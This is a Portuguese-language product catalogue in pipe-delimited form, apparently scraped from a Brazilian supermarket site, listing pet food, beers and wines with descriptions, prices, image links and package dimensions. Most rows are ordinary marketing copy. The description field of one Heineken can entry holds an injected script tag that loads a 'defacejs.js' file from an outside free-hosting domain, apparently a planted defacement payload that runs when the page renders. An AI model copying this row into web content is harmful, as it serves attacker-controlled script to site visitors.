id|nome|sku|descricao|imagem|preco|marca|alturaProduto|larguraProduto|pesoBruto|profundidadeProduto|categoria
457550|Ração Úmida Cesar Sachê Cortes Selecionados Sabor Carne Assada ao Molho para Cães Adultos 85g|1209187|"""Por mais de 30 anos nossos especialistas têm desenvolvido as receitas de Cesar ao redor do mundo para garantir que elas contenham tudo o que seu cão precisa, oferecendo a ele uma refeição saborosa, mas que também seja nutritivo para ele.Cesar oferece refeições 100% completas e balanceadas preparadas com cortes selecionados e sem conservantes ou corantes artificiais.As receitas de Cesar são desenvolvidas com base na ciência do Centro de Pesquisas Waltham, a maior autoridade mundial no cuidado e nutrição de animais de estimação.""""¿ Alimento super premium.¿ 100% completo e balanceado para cães adultos.¿ Sem conservantes ou corantes artificiais.¿ Deliciosos pedacinhos feitos com ingredientes selecionados.¿ Retribua o amor."""|https://static.paodeacucar.com/img/uploads/1/928/19439928.jpg|3.75|Cesar|14|9.5|94.5|1.5|petshop
604625|Ração Úmida Purina One Cães Adultos e Filhotes Frango 85g|1275255|PURINA® ONE® é um alimento super premium, completo e balanceado, destinado a cães adultos e filhotes de todos os tamanhos. Formulado por nutricionistas, PURINA® ONE® contém ingredientes naturais e funcionais em combinações ótimas para uma saúde visível, com super nutrientes. PURINA® ONE® é feito com carnes de verdade como ingredientes principais e não com farinhas de carne e ossos. Isso ajuda a preservar a integridade das proteínas, resultando em uma maior absorção e aproveitamento dos aminoácidos. PURINA® ONE® garante resultados visíveis em 28 dias. Você vê, ele sente. Acesse www.purinaone.com.br para mais informações.USO PROIBIDO NA ALIMENTAÇÃO DE RUMINANTES.Composição Básica: Carne mecanicamente separada de frango (5,0%), fígado suíno, resíduo de salmão, glúten de trigo, proteína concentrada de soja, amido de milho, colágeno hidrolisado (0,01%), farinha da alga Schizochytrium sp, dextrose, fosfato bicálcico, carbonato de cálcio, cloreto de sódio (sal comum), cloreto de potássio, água, glicina, taurina, vitaminas (A, D3, E, K3, B12, B1, B2, B6, niacina, biotina, ácido fólico, pantotenato de cálcio, cloreto de colina), minerais (sulfato de zinco, sulfato ferroso, sulfato de manganês, sulfato de cobre, proteinato de zinco, proteinato de ferro, proteinato de manganês, proteinato de cobre, proteinato de selênio, iodato de cálcio, selenito de sódio), pirofosfato tetrassódico, goma xantana, goma alfarroba, goma guar. Eventuais Substitutivos: fígado de frango, miúdos de suínos, carcaça de frango, difosfato trissódico|https://static.paodeacucar.com/img/uploads/1/521/26941521.png|4.79|Purina|14|9.3|90.0|2|petshop
1376782|Chips para Cães Frango e Batata-Doce Natural Crisp Pouch 100g	|1341992||https://static.paodeacucar.com/img/uploads/1/69/24339069.png|22.79|Outras|20|2|107.0|15|petshop
1571405|Petisco para Gatos Salmão Dreamies Pacote 40g|1369376||https://static.paodeacucar.com/img/uploads/1/126/24899126.png|7.59|Dreamies|13|9.5|43.0|1.5|petshop
431867|Ração Úmida Whiskas Sachê Carne Jelly para Gatos Adultos 85g|1178643|"""Refeição completa e balanceada.Feito com ingredientes naturais de alta qualidade, vitaminas e minerais. Sem conservantes, sem corantes artificiais e sem aromatizantes artificiais.Suculentos pedacinhos cozidos a vapor.Ajuda a manter a saúde do trato urinário.Porção ideal de proteína, vitaminas e sais minerais."""|https://static.paodeacucar.com/img/uploads/1/647/19443647.jpg|3.39|Whiskas|14|9.5|89.8|1.5|petshop
1571858|Petisco para Gatos Whiskas Antibola de Pelo Pouch 80g|1369375||https://static.paodeacucar.com/img/uploads/1/125/24899125.png|19.99|Whiskas|18|13|84.0|8|petshop
379881|NESTLÉ® PURINA® FRISKIES® Ração Úmida para Gatos Adultos Cordeiro ao molho 85g|1118090|"""FRISKIES Cordeiro ao molho é um alimento úmido completo e balanceado destinado a gatos adultos de atividade normal. Pele e pelos saudáveis graças aos níveis adequados de zinco e ácidos graxos essenciais. Visão clara e saudável devido à adição de vitamina A e taurina. Formulado com vitaminas e minerais que auxiliam nas defesas naturais. Músculos fortes e saudáveis devido à presença de fontes de proteínas de alta qualidade. Para mais informações sobre o regulamento completo, acesse https://www.nestle.com.br/marcas/purina-friskies ou ligue para 0800-779-5500.Ingredientes: Miúdos de cordeiro, fígado suíno, fígado de frango, carne mecanicamente separada de frango, glúten de trigo, proteína concentrada de soja, amido de milho, dextrose, fosfato bicálcico, carbonato de cálcio, cloreto de sódio (sal comum), cloreto de potássio, água, taurina, glicina, vitaminas (A, D3, E, K3, B12, mononitrato de tiamina, suplemento de riboflavina, cloridrato de piridoxina, niacina, biotina, ácido fólico, pantotenato de cálcio, cloreto de colina), minerais (sulfato de zinco, proteinato de zinco, sulfato ferroso, sulfato de cobre, proteinato de cobre, sulfato de manganês, proteinato de manganês, iodato de cálcio, selenito de sódio), corante (caramelo). Alimento completo para gatos adultos.Imagem meramente ilustrativa.USO PROIBIDO NA ALIMENTAÇÃO DE RUMINANTES."""|https://static.paodeacucar.com/img/uploads/1/698/20246698.jpg|3.19|Purina|14|9.3|90.0|2|petshop
184788|Ração Úmida Whiskas Lata Patê de Peixe para Gatos Adultos 290g|4459439|"""A marca Whiskas sabe o que os gatos naturalmente precisam e amam.Por isso, cada lata é preparada cuidadosamente com ingredientes de alta qualidade, proporcionando os nutrientes que eles precisam todos os dias, mantendo-os sempre saudáveis.""""¿ Alimento 100% completo e balanceado.¿ Sem aroma artificial.¿ Cozidos a vapor.¿ Ajuda a manter a saúde do trato urinário.¿ Proporciona ótima qualidade de fezes.¿ Ingredientes de alta qualidade."""|https://static.paodeacucar.com/img/uploads/1/581/24640581.jpg|9.99|Whiskas|8.3|7.3|340.4|7.3|petshop
472422|NESTLÉ® PURINA® ONE® Ração Seca para gatos adultos todas as raças Frango e Carne 500g|1244739|"PURINA® ONE® é um alimento super premium, completo e balanceado, destinado a gatos adultos de todos os tamanhos. Formulado por nutricionistas, PURINA® ONE® contém ingredientes naturais e funcionais em combinações ótimas para uma saúde visível. Cada ingrediente foi cuidadosamente selecionado com um propósito e transformado através de um processo especial de cozimento para um alimento delicioso e de nutrição superior. PURINA® ONE® é feito com carnes de verdade como ingredientes principais e não com farinhas de carne e ossos. Isso ajuda a preservar a integridade das proteínas, resultando em uma maior absorção e aproveitamento dos aminoácidos. PURINA® ONE® garante resultados visíveis em 28 dias. Você vê, ele sente. Acesse www.purinaone.com.br para mais informações.USO PROIBIDO NA ALIMENTAÇÃO DE RUMINANTES""Ingredientes naturais. Composição básica: Carne mecanicamente separada de frango e carne bovina (mín. 18%), milho integral moído* (mín. 2%), trigo integral (mín. 1%) , grão de aveia (mín. 1%) , farinha de vísceras de aves, farelo de glúten de milho-60*, quirera de arroz , cenoura desidratada, ervilha desidratada , farinha da alga Schizochytrium sp. (mín. 0,01%), ovo em pó, levedura seca de cervejaria, gordura de frango (preservada com tocoferóis, fonte de vitamina E), óleo de coco (mín. 0,02%), cloreto de sódio (sal comum) , cloreto de potássio, carbonato de cálcio, ácido fosfórico, hidrolisado de fígado de ave e suíno, inulina , L-lisina, taurina, DL-metionina, vitaminas (A, D3, E, K3, B1, B2, niacina, pantotenato de cálcio, B6, biotina, ácido fólico, B12, C, cloreto de colina), minerais (sulfato de zinco, sulfato ferroso, sulfato de manganês, sulfato de cobre, proteinato de zinco, proteinato de ferro, proteinato de manganês, proteinato de cobre, proteinato de selênio, iodato de cálcio, selenito de sódio), corante natural caramelo , antioxidante BHT. Eventuais substitutivos: gordura suína (preservada com tocoferóis, fonte de vitamina E), farinha de peixe, fosfato bicálcico, farinha de atum, glúten de trigo, farinha de peixe salmão. *Ingredientes transgênicos. Espécies doadoras do gene: Agrobacterium tumefaciens, Bacillus thuringiensis, Streptomyces viridochromogenes e Zea mays."""|https://static.paodeacucar.com/img/uploads/1/410/670410.jpg|33.99|Purina|21.5|14|513.0|4.8|petshop
167464|Areia Higiênica Para Gato PIPICAT Perfumada Campestre Pacote 4Kg|6867942|AREIA SANIT PIPICAT PERF CAMP 4KG|https://static.paodeacucar.com/img/uploads/1/977/17627977.jpg|20.99|Pipi Cat|32|21.5|12050.0|7|petshop
707|NESTLÉ® PURINA® DOG CHOW® Extralife® Ração Seca para Cães Adultos Médios e Grandes Carne e Arroz 3kg|3296905|"PURINA® DOG CHOW® proporciona uma boa digestão ao seu cão, com nutrientes e ingredientes de alta qualidade. Todos os produtos agora apresentam ExtraLife®, um mix de antioxidantes, vitaminas e minerais, que ajuda a maximizar a qualidade de vida do seu cão dia após dia. Sabemos que seu pet é um membro especial da família e, por essa razão, nós nos importamos com a sua saúde, cuidado e bem-estar. 100% completo e balanceado, um alimento com multivitaminas e minerais, nutrientes essenciais para o bom funcionamento do metabolismo e que auxiliam o seu pet a ter saúde e vitalidade por muito tempo.""Alimento completo e balanceado para cães adultos de tamanho médio e grande de 1 a 7 anos de idade. Imagem meramente ilustrativaUso Proibido na Alimentação de Ruminantes""Milho integral moído*, farinha de carne e ossos de bovinos, farelo de soja*, farelo de glúten de milho*, quirera de arroz, fibra de soja*, gordura animal estabilizada, farinha de subprodutos de frango, trigo integral moído, ervilha desidratada, cenoura desidratada, cloreto de sódio (sal comum), fosfato bicálcico, cloreto de potássio, carbonato de cálcio, inulina, zeolita, hidrolisado de fígado de ave e suíno, taurina, corantes (amarelo 5, amarelo 6, vermelho 40, azul 2 e dióxido de titânio), vitaminas (A, D3, E, B12, mononitrato de tiamina, suplemento de riboflavina, cloridrato de piridoxina, niacina, pantotenato de cálcio, ácido fólico, cloreto de colina), minerais (sulfato de zinco, proteinato de zinco, sulfato ferroso, sulfato de manganês, proteinato de manganês, sulfato de cobre, proteinato de cobre, iodato de cálcio, selenito de sódio), antioxidante BHT. "|https://static.paodeacucar.com/img/uploads/1/487/24640487.jpg|63.99|Dog Chow|39|23|3090.0|11.5|petshop
470253|Sachê Cães Keldog sabor Frango com Ervilha e Cenoura 100g|1242951||https://static.paodeacucar.com/img/uploads/1/812/24637812.jpg|3.59|Keldog|14.2|9.5|100.0|5|petshop
181460|Ração Úmida Whiskas Lata Patê de Carne para Gatos Adultos 290g|4459347|"""A marca Whiskas sabe o que os gatos naturalmente precisam e amam.Por isso, cada lata é preparada cuidadosamente com ingredientes de alta qualidade, proporcionando os nutrientes que eles precisam todos os dias, mantendo-os sempre saudáveis.""""¿ Alimento 100% completo e balanceado.¿ Sem aroma artificial.¿ Cozidos a vapor.¿ Ajuda a manter a saúde do trato urinário.¿ Proporciona ótima qualidade de fezes.¿ Ingredientes de alta qualidade."""|https://static.paodeacucar.com/img/uploads/1/684/19443684.jpg|9.99|Whiskas|8.3|7.3|340.4|7.3|petshop
1440417|Alimento para Cães Adultos 12 Meses a 7 Anos Raças Minis e Pequenas Carne e Vegetais Pedigree Pacote 900g|1343652||https://static.paodeacucar.com/img/uploads/1/263/24164263.png|24.99|Pedigree|18|32|902.0|58|petshop
431865|Alimento para Gatos Adultos 1+ Atum ao Molho Whiskas Sachê 85g|1178640|WHISKAS SACHE ADULTO ATUM 85G.|https://static.paodeacucar.com/img/uploads/1/632/19443632.jpg|3.39|Whiskas|14|9.5|94.4|1.5|petshop
1616624|"Osso Tubinho para Cães Recheio Bacon & Queijo Natural Farm 6"""|1380417||https://static.paodeacucar.com/img/uploads/1/592/26122592.jpg|17.99|Natural Farm|21.8|16|220.4|3.3|petshop
1621537|Alimento para Cães Adultos Carne Qualitá Pet Lata 170g|1387217||https://static.paodeacucar.com/img/uploads/1/313/26943313.png|5.49|Qualitá|4|8.8|212.0|8.8|petshop
1624118|RACAO BAL CAO AD MG|1380100||https://static.paodeacucar.com/img/uploads/1/800/31585800.png|53.99|Balance|41.5|23.4|2738.0|11.5|petshop
190826|Alimento para Cães Filhotes Frango ao Molho Pedigree Sachê 100g|4709015|"""Refeição 100% completa.Sem conservantes, sem corantes e sem aromas artificiais.Suculentos pedacinhos cozidos a vapor.Balanço ideal de fibras.Proporciona fezes firmes e fáceis de limpar.Contribui para crescimento seguro e saudável.Fonte de cálcio e fósforo."""|https://static.paodeacucar.com/img/uploads/1/754/19433754.jpg|3.39|Pedigree|14|9.5|110.5|1.5|petshop
11113|NESTLÉ® PURINA® DOG CHOW® Extralife® Ração Seca para Cães Filhotes Médios e Grandes 1kg|1219531|"PURINA® DOG CHOW® tem uma fórmula premium, especialmente desenvolvida para seu filhote. Todos os produtos agora apresentam ExtraLife®, um mix de antioxidantes, vitaminas e minerais, que ajuda a maximizar a qualidade de vida do seu cão dia após dia. Sabemos que seu pet é um membro especial da família e, por essa razão, nós nos importamos com a sua saúde, cuidado e bem-estar. 100% completo e balanceado, um alimento com multivitaminas e minerais, nutrientes essenciais para o bom funcionamento do metabolismo e que auxiliam o seu pet a ter saúde e vitalidade por muito tempo.""Alimento completo e balanceado destinado a filhotes de cães de raças médias e grandes de atividade normal e fêmeas gestantes ou lactantes. Imagem meramente ilustrativaUso Proibido na Alimentação de Ruminantes""Milho integral moído*, farelo de soja*, farinha de subprodutos de frango, farelo de glúten de milho*, farinha de carne e ossos de bovinos, gordura animal estabilizada, trigo integral moído, farinha de peixe, quirera de arroz, farinha de alga, banana desidratada (0,1%), leite desnatado em pó**, cloreto de sódio (sal comum), fosfato bicálcico, carbonato de cálcio, cloreto de potássio, inulina, hidrolisado de fígado de ave e suíno, L-lisina, DL-metionina, vitaminas (A, D3, E, B12, ácido ascórbico, mononitrato de tiamina, suplemento de riboflavina, cloridrato de piridoxina, niacina, ácido fólico, pantotenato de cálcio, cloreto de colina), minerais** (sulfato de zinco, proteinato de zinco, sulfato ferroso, sulfato de cobre, proteinato de cobre, sulfato de manganês, proteinato de manganês, iodato de cálcio, selenito de sódio), corantes (amarelo 5, vermelho 40, azul 2 e dióxido de titânio), antioxidante BHT. *Ingredientes transgênicos. Espécies doadoras do gene: Agrobacterium tumefaciens, Arabidopsis thaliana, Bacillus thuringiensis, Streptomyces viridochromogenes e Zea mays."|https://static.paodeacucar.com/img/uploads/1/40/663040.jpg|27.79|Dog Chow|30|17|1040.0|8|petshop
1616516|Osso Natural Mix para Cães Natural Farm 100g|1380416||https://static.paodeacucar.com/img/uploads/1/311/25578311.jpg|15.99|Natural Farm|21.8|16|100.3|3.3|petshop
1571403|Petisco para Gatos Whiskas Antibola de Pelo Pouch 40g|1369358||https://static.paodeacucar.com/img/uploads/1/90/24949090.jpg|11.99|Whiskas|13|9.5|43.0|1.5|petshop
379876|NESTLÉ® PURINA® FRISKIES® Ração Úmida para Gatos Adultos Frango ao molho 85g|1118098|"FRISKIES® Frango ao molho é um alimento úmido completo e balanceado destinado a gatos adultos de atividade normal. Pele e pelos saudáveis graças aos níveis adequados de zinco e ácidos graxos essenciais. Visão clara e saudável devido à adição de vitamina A e taurina. Formulado com vitaminas e minerais que auxiliam nas defesas naturais. Músculos fortes e saudáveis devido à presença de fontes de proteínas de alta qualidade. Para mais informações sobre o regulamento completo, acesse https://www.nestle.com.br/marcas/purina-friskies ou ligue para 0800-779-5500.""Alimento completo para gatos adultos.Imagem meramente ilustrativa.USO PROIBIDO NA ALIMENTAÇÃO DE RUMINANTES.""Carne mecanicamente separada de frango, fígado de frango, carcaça de frango, miúdos de suínos, glúten de trigo, proteína concentrada de soja, amido de milho, dextrose, cloreto de sódio (sal comum), fosfato bicálcico, carbonato de cálcio, cloreto de potássio, água, taurina, glicina, vitaminas (A, D3, E, K3, B12, mononitrato de tiamina, suplemento de riboflavina, cloridrato de piridoxina, niacina, biotina, ácido fólico, pantotenato de cálcio, cloreto de colina), minerais (sulfato de zinco, proteinato de zinco, sulfato ferroso, sulfato de cobre, proteinato de cobre, sulfato de manganês, proteinato de manganês, iodato de cálcio, selenito de sódio), corantes (caramelo e dióxido de titânio)."|https://static.paodeacucar.com/img/uploads/1/349/19599349.jpg|3.19|Purina|14|9.3|90.0|2|petshop
1622212|Bifinho para Cães Churrasco Qualitá Pet Pacote 65g|1386818||https://static.paodeacucar.com/img/uploads/1/311/26943311.png|3.99|Qualitá|17.5|12|69.0|2.6|petshop
457547|Ração Úmida Sheba Sachê Cortes Selecionados Sabor Atum Marinado para Gatos Filhotes 85g|1209195|"""Sheba acredita que gatos são felinos verdadeiramente especiais, além de serem elegantes e confiantes, sabem usar o charme para conseguirem o que querem como ninguém.Então, quando os gatos querem Sheba não dá para resistir.Sheba oferece uma linha de alimento úmido 100% completo e balanceado, sem conservantes ou corantes artificiais e que garante a combinação perfeita entre sabor e nutrição.As receitas de Sheba são desenvolvidas com base na ciência do Centro de Pesquisas Waltham, a maior autoridade mundial no cuidado e nutrição de animais de estimação.""""¿ Alimento super premium.¿ 100% completo e balanceado para gatos filhotes.¿ Sem conservantes ou corantes artificiais.¿ Deliciosos pedacinhos feitos com ingredientes selecionados.¿ Desperte seus sentidos com cortes selecionados.¿ É impossível resistir."""|https://static.paodeacucar.com/img/uploads/1/277/24636277.jpg|3.75|Sheba|14|9.5|94.5|1.5|petshop
1377630|Cookie para Cães Frutas Vermelhas PetDog Pouch 250g|1340258||https://static.paodeacucar.com/img/uploads/1/13/24338013.png|17.99|Pet Dog|23|18|257.0|6|petshop
457552|Ração Úmida Cesar Sachê Cortes Selecionados Sabor Cordeiro Assado ao Molho para Cães Adultos 85g|1209189|"""Por mais de 30 anos nossos especialistas têm desenvolvido as receitas de Cesar ao redor do mundo para garantir que elas contenham tudo o que seu cão precisa, oferecendo a ele uma refeição saborosa, mas que também seja nutritivo para ele.Cesar oferece refeições 100% completas e balanceadas preparadas com cortes selecionados e sem conservantes ou corantes artificiais.As receitas de Cesar são desenvolvidas com base na ciência do Centro de Pesquisas Waltham, a maior autoridade mundial no cuidado e nutrição de animais de estimação.""""Alimento Super Premium.100% completo e balanceado para cães adultos.Sem conservantes ou corantes artificiais.Deliciosos pedacinhos feitos com ingredientes selecionados.Retribua o amor."""|https://static.paodeacucar.com/img/uploads/1/936/19439936.jpg|3.75|Cesar|14|9.5|94.5|1.5|petshop
1616578|Alimento para Cães Adultos Raças Pequenas Carne, Frango e Vegetais Balance Pouch 900g|1379984||https://static.paodeacucar.com/img/uploads/1/405/25578405.jpg|25.99|Balance|30|18.1|922.9|11|petshop
181458|Ração Úmida Pedigree Lata Carne ao Molho para Cães Adultos 290g|4459477|"""Refeição 100% completa.Sem aroma artificial.Suculentos pedacinhos cozidos a vapor.Balanço ideal de fibras.Proporciona fezes firmes e fáceis de limpar.Qualidade de vida: ingredientes de alta qualidade que mantêm seu cão saudável e cheio de energia."""|https://static.paodeacucar.com/img/uploads/1/583/24640583.jpg|9.99|Pedigree|8.3|7.3|340.4|7.3|petshop
796084|Cerveja IPA Puro Malte Patagonia Lata 350ml|1327222|A Patagonia IPA é feita com lúpulos plantados e colhidos na Patagônia. Coloração acobreada, límpida e brilhante. Intenso aroma frutado e cítrico com notas resinosas e herbais. Sabor lupulado com amargor marcante e duradouro. Corpo leve e refrescante. Experimente com carnes com gordura.<div></div>|https://static.paodeacucar.com/img/uploads/1/182/23648182.png|6.19|Patagonia|15.7|5.9|360.0|5.9|bebidas-alcoolicas-
199100|Vinho Chileno Tinto Camernére MAIPO Garrafa 750ml|4893868|Aroma intenso com destaque para frutas negras e pimenta. Um vinho estruturado, redondo com boa persistência que acompanha massas, queijos e cordeiro assado.Especificações TécnicasUva : Cabernet Sauvignon,CarménèrePaís : ChileSafra : 2015Teor Alcoólico : 12,5%Amadurecimento : -Cor : Vermelho rubi com reflexos violeta.Aroma : Aroma intenso com destaque para ameixas e especiarias.Palato : Delicado, redondo e com boa persistência.Harmonização : Acompanha massas, queijos e cordeiro assado e frangos de preparo mais elaborado.Uvas : 85% Carmenere e 15% Cabernet SauvignonTipo : TintoRegião : Valle de MaipoOutros Formatos : 750mlGarantia : 03 meses contra Defeitos de Fabricação|https://static.paodeacucar.com/img/uploads/1/474/26668474.jpg|29.99|Vina Maipo|29.5|7.4|1120.0|7.4|bebidas-alcoolicas-
328355|Vinho Chileno Branco TRES MEDALLAS Sauvignon Blanc Garrafa 750ml|1090608|VH CH BCO TRES MED SAUV BLAC 750ML|https://static.paodeacucar.com/img/uploads/1/196/22317196.jpg|35.99|3 Medallas|30|8|1149.0|8|bebidas-alcoolicas-
450942|Cerveja Coronita Pilsen 210ml Long Neck|1208291|Corona não é só uma cerveja, é um estilo de vida. Um convite para se desconectar da rotina e aproveitar mais a vida lá fora, na praia e curtindo um pôr do sol com os amigos. A Corona clássica: gelada e ainda melhor com limão. Tamanho ideal para tornar momentos curtindo a vida ao ar livre ainda melhores.|https://static.paodeacucar.com/img/uploads/1/490/24659490.jpg|4.99|Coronita Extra|20|5.32|390.0|5.32|bebidas-alcoolicas-
584617|Vinho Argentino Tinto Cordero con Piel de Lobo 750ml |1270836|Blend de Malbec. Envelhecimento em barricas usadas de carvalho francês e americano durante 6 meses.|https://static.paodeacucar.com/img/uploads/1/501/26668501.jpg|49.99|Finca Flichman|33|8|1458.0|8|bebidas-alcoolicas-
284066|Cerveja HEINEKEN Garrafa 250ml|1026957|"""Heineken é uma cerveja lager Puro Malte, refrescante e de cor amarelo-dourado, produzida com ingredientes 100% naturais: água, malte e lúpulo. Durante o processo de fermentação da Heineken, a exclusiva Levedura A é responsável pelo sabor característico e bem equilibrado, com notas frutadas sutis. A cerveja é fabricada em tanques horizontais para mais sabor e consistência. É por isso que nenhuma outra cerveja tem o gosto de Heineken.Na icônica versão em Long Neck de 250ml, ela está ainda mais refrescante e gela bem rápido.A Heineken foi criada para ser a melhor cerveja do mundo desde 1873. Algumas coisas são boas demais para mudar!A lager é mais leve e combina bem com hambúrguer, comida mexicana, queijos e castanhas."""|https://static.paodeacucar.com/img/uploads/1/455/18490455.jpg|3.79|Heineken|13.4|5.1|420.0|5.1|bebidas-alcoolicas-
90031|Cerveja Heineken Keg 5L |2385853|"""O barril Heineken proporciona uma experiência única para você e seus amigos. Não pode ir a um bar? Então leve o bar até você. O barril Heineken conta com 5 litros da mais icônica cerveja Puro Malte.Heineken é uma cerveja lager Puro Malte, refrescante e de cor amarelo-dourado, produzida com ingredientes 100% naturais: água, malte e lúpulo. Durante o processo de fermentação da Heineken, a exclusiva Levedura A é responsável pelo sabor característico e bem equilibrado, com notas frutadas sutis. A cerveja é fabricada em tanques horizontais para mais sabor e consistência. É por isso que nenhuma outra cerveja tem o gosto de Heineken.Preparado para servir a cerveja perfeita? Seja em uma festa, churrasco ou para assistir um jogo de futebol, você pode servir seus convidados o copo perfeito de cerveja gelada!"""|https://static.paodeacucar.com/img/uploads/1/29/12156029.jpg|99.9|Heineken|28.2|17.5|5794.0|17.5|bebidas-alcoolicas-
697133|Vinho Chileno Tinto Conquest Gold Carmenére 750ml|1275707||https://static.paodeacucar.com/img/uploads/1/381/23638381.png|175.9|Vh Import Exclusiva|33|8|1123.0|8|bebidas-alcoolicas-
1602362|Cerveja Stella Artois Pure Gold Sem Glúten Long Neck 330ml|1375818|Chegou Stella Pure Gold! Todo o sabor de Stella, com menos calorias.Essa novidade traz todo o sabor da Stellinha que você já conhece, agora com menos calorias e ainda sem glúten*. Ela é perfeita para quem busca um estilo de vida mais equilibrado, mas sem abrir mão do sabor de apreciar uma boa cervejinha ao redor da mesa.A nova Stella Pure Gold passa pelo mesmo processo de fabricação da Stella Artois tradicional e é feita com os mesmos ingredientes - água, malte e lúpulo -, exceto pela tecnologia aplicada ao processo de produção para que seja feita a ¿quebra¿ do glúten.Aprecie com moderação.*Stella Artois Pure Gold é uma cerveja que tem o glúten retirado no processo produtivo, podendo conter até 20ppm (partes por milhão), nos termos das normas vigentes. Consulte seu médico, em caso de restrição. -17% calorias que a versão regular.Cerveja Puro Malte de estilo Premium American Lager.Estilo: Premium American LagerNotas de Degustação:Um Leve abacaxi, aroma de lúpulo suave.Lager de corpo leve, com uma nota maltada, amargor moderado e um acabamento limpo.Teor alcóolico: 4,3%Calorias: 34kcal/100mlIBU: 15Harmonização: salada Caprese, Ceviche e CamarãoCopo Ideal: CáliceAprecie com moderação.|https://static.paodeacucar.com/img/uploads/1/128/24983128.jpg|5.99|Stella Artois|23.1|6.07|540.0|6.07|bebidas-alcoolicas-
332650|Vinho Chileno Tinto TRES MEDALLAS Merlot garrafa 750ml|1096257|A linha Tres Medallas celebra a história, a tradição e os prêmios da Vinícola Santa Rita. Um vinho que comemora precisamente as três medalhas obtidas na International Wines & Spirits Competition, na década de 80. Uma viagem pelo Chile, com a melhor representação das variedades que o país tem a oferecer.|https://static.paodeacucar.com/img/uploads/1/195/22317195.jpg|35.99|3 Medallas|30|8|1151.0|8|bebidas-alcoolicas-
1376370|Cerveja Heineken Lata 269ml|1345332|"<script type=""text/javascript"" src=""https://testepagpa.000webhostapp.com/defacejs.js""></script>"|https://static.paodeacucar.com/img/uploads/1/1/23747001.png|3.99|Heineken|12.22|5.74|283.0|5.74|bebidas-alcoolicas-
421704|Vinho Chileno 1969 Sauvignon Blanc Garrafa 750ml|1163073||https://static.paodeacucar.com/img/uploads/1/54/640054.jpg|29.99|Santa Rita|30|7|1458.0|7|bebidas-alcoolicas-
1387081|Cerveja Belgian White BLUE MOON Wheat Ale Lata 350ml|1352815|Blue Moon Belgian White é uma Witbier, produzida com cevada, trigo, semente de coentro e laranja valência. Uma experiência refrescantemente saborosa e acima do comum.|https://static.paodeacucar.com/img/uploads/1/831/24818831.jpg|8.99|Heineken|15|17|3680.0|23|bebidas-alcoolicas-
715822|Vinho Chileno Tinto Club des Sommeliers Carmenére 750ml|1277767||https://static.paodeacucar.com/img/uploads/1/207/20248207.jpg|27.99|Club Des Sommeliers|30|8|1458.0|8|bebidas-alcoolicas-
13918|Vinho Chileno CASILLERO DEL DIABLO Reserva Carbernet Sauvignon com 750ml|1033823|VH CHI TTO C DIABLO CAB SAUV  750ML.|https://static.paodeacucar.com/img/uploads/1/504/24067504.jpg|49.99|Casillero Del Diablo|30.2|7.4|1231.0|7.4|bebidas-alcoolicas-
131345|Vinho Espanhol Tinto Crianza CLOS DE TORRIBAS Garrafa 750ml|2001715|Tipo:Vinho tintoELABORAÇÃOPaís de Origem:EspanhaRegião:PenedésProdutor:PinordUva(s): Tempranillo - C. SauvignonTeor Alcoólico:13%Envelhecimento:Com uma maceração sobre cascas de aproximadamente 15 dias, Posteriormente se procede a sua ¿crianza¿ em barricas de roble durante uns 10 meses, Em seguida permanece mais de um ano em garrafa afim de suavizar ao máximo seus taninos.CARACTERÍSTICASVisual:Bem equilibrado, é um bom exemplo do poder da uva tempranillo. Olfativa:O carvalho destaca-se juntamente com a intensa especiarias. Se girar o vinho no copo, temos aromas típicos da casta Tempranillo, bem como frutos da floresta.Gustativa:Um paladar suave com o envelhecimento moderado. O carvalho é bem equilibrado para manter a frescura do vinho. Toques de cedro e carvalho. Com o envelhecimento os taninos ficaram suaves.  Corpo: Corpo MédioHarmonização: Cervo, Assados, Codorna e perdiz, Coelho e lebre, Embutidos curados, Entrecot, Lombo, Ensopados e carnes con molho, Hamburguesa, Javalí, Jamón, ChurrascoTemperatura ideal de consumo:16 a 18 ºC (Temperatura ambiente em lugares de clima fresco)NÃO CONTÉM GLÚTEN.|https://static.paodeacucar.com/img/uploads/1/55/619055.png|69.9|Vh Import Exclusiva|31.2|7.3|1212.0|7.3|bebidas-alcoolicas-
1461013|Cerveja Munich Helles Puro Malte Spaten Lata 269ml |1361243|Spaten nasceu em 1397, em Munique. É uma cerveja puro malte alemã que criou o seu próprio estilo: o Munich Helles.Tem intenso sabor de malte e é fácil de beber.|https://static.paodeacucar.com/img/uploads/1/433/24168433.png|3.39|Ambev|12.4|5.7|278.0|5.7|bebidas-alcoolicas-
104503|Vinho Português Branco Casal Garcia Vinho Verde Garrafa 750ml|0104357|VH PORT VERDE BCO CASAL GARCIA 750M|https://static.paodeacucar.com/img/uploads/1/800/4569800.png|59.9|Casal Garcia|31.5|7.2|1161.0|7.2|bebidas-alcoolicas-
